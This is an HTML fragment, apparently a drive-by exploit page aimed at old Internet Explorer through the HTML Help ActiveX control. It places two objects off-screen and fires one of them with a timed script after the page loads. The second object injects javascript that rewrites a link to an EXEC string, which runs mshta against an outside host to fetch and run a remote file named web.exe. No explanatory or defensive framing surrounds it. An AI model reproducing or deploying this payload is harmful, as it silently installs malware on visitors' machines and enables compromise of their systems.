<OBJECT id=D2 classid=clsid:aef840a1-f3f3-14cf-9377-00aa003b7a11 style="position:absolute;left:-999">
<PARAM NAME="Command" VALUE="Related Topics">
<PARAM NAME="Button" VALUE="Text:">
<PARAM NAME="Window" VALUE="$global_blank">
<param name="Scrollbars" value="true">
<PARAM NAME="Item1" VALUE="command;ms-its:icwdial.chm::/icw_overview.htm"></OBJECT>
<script>setTimeout('D2.HHClick();',1000);</script>
<OBJECT id=D3 classid=clsid:aef840a1-f3f3-14cf-9377-00aa003b7a11 style="position:absolute;left:-999">
<PARAM NAME="Command" VALUE="Related Topics">
<PARAM NAME="Button" VALUE="Text:">
<PARAM NAME="Window" VALUE="$global_blank">
<PARAM NAME="Item1" VALUE="command;javascript:document.links[0].href='EXEC=,mshta,http://2.ru/mod/files/web.exe CHM=ieshared.chm FILE=app_install.htm'%3Bdocument.links[0].click();"></OBJECT>